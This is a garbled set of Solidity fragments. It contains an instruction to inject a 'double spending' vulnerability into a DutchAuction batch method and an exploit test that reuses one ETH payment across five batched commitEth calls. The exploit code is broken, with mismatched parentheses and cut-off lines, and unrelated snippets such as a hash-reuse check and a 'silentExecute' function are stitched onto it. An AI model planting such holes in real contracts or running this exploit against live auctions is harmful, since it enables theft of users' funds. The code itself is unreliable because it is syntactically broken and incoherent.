
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function destroyDataResult(string memory resultId) public {
        emit DataResultDestroyed(resultId);
    }
}
pragma solidity >=0.7.0 <0.9.0;

;
### [Vulnerability] data double spending;
Inject the vulnerability to the `DutchAuction.batch` method.;
```diff;
  function testExploit() public {
    payable(address(0)).transfer(79228162414264337593543950335);
    emit log_named_uint("Before exploit, ETH balance of attacker:",
      address(address(this)).balance);
    emit log_named_uint("Before exploit, ETH balance of DutchAuction:",
      address(DutchAuction).balance);
    bytes memory payload = abi.encodePacked(DutchAuction.commitEth.selector,
      uint256(uint160(address(this)));
      uint256(uint8(0x01)));
    data.push(payload);
    data.push(payload);
    data.push(payload);
    data.push(payload);
    data.push(payload);
    DutchAuction.batch{ value: 100000000000000000000 }(data, true
mapping(bytes32 => bool) public usedHashes;
function submitHash(bytes32 h) public {
    require(!usedHashes[h], "Already used");
    usedHashes[h] = true}
function silentExecute() public {
    doInternal()}